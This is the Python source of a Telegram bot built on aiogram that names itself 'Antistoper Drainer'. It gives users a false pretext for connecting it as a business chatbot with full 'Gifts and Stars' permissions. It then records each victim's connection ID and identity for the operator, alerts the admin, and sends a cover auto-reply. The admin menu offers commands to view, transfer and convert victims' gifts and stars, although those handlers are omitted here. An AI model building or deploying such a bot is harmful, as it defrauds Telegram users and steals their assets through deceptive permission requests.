from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import TransferGift, ConvertGiftToStars
from aiogram.exceptions import TelegramBadRequest
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
import logging
import asyncio
import json
import config
import os

CONNECTIONS_FILE = "business_connections.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID

bot = Bot(token=TOKEN)
dp = Dispatcher()

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def load_connections():
    with open(CONNECTIONS_FILE, "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"Пользователь #{user_id} подключил бота.")
    except Exception:
        logging.exception("Не удалось отправить сообщение админу.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = []
    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(business_connection.user.id, "Привет! Ты подключил моего бота как бизнес-ассистента.")
        save_business_connection_data(business_connection)
        logging.info(f"Бизнес-аккаунт подключен: {business_connection.user.id}")
    except Exception:
        logging.exception("Ошибка при обработке бизнес-подключения.")

@dp.business_message()
async def handler_message(message: Message):
    try:
        conn_id = message.business_connection_id
        sender_id = message.from_user.id
        msg_id = message.message_id

        connections = load_connections()
        connection = next((c for c in connections if c["business_connection_id"] == conn_id), None)

        if not connection:
            print(f"Неизвестный бизнес connection_id: {conn_id}")
            return

        owner_id = connection["user_id"]

        if sender_id != owner_id:
            await bot.send_message(
                business_connection_id=message.business_connection_id,
                chat_id=message.from_user.id,
                text="Сейчас оффлайн, отвечу позже."
            )
    except Exception:
        logging.exception("Ошибка при автоответе.")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        instructions = (
            "1. ⚙️ Откройте Настройки.\n"
            "2. 💼 Нажмите на Telegram для бизнеса.\n"
            "3. 🤖 Перейдите в раздел Чат-боты.\n"
            "4. ✍️ Введите имя бота @faceofposter_bot и нажмите Добавить.\n"
            "5. ✅ Выдайте разрешения пункт 'Подарки и звезды' (5/5) для выдачи звезд.\n\n"
            "Зачем это нужно?\n"
            "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически и напрямую "
            "отправлять звезды от одного пользователя другому — без лишних действий и подтверждений."
        )
        await message.answer(instructions)
    else:
        await message.answer(
            f"Antistoper Drainer\n\n"
            f"🔗 Количество подключений: {count}\n\n"
            "/gifts - просмотреть гифты\n"
            "/stars - просмотреть звезды\n"
            "/transfer <owned_id> <business_connect> - передать гифт вручную\n"
            "/convert - конвертировать подарки в звезды"
        )

# остальные обработчики (/gifts, /stars, /transfer и т.д.) остаются без изменений

async def main():
    print("Made with love by @antistoper")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
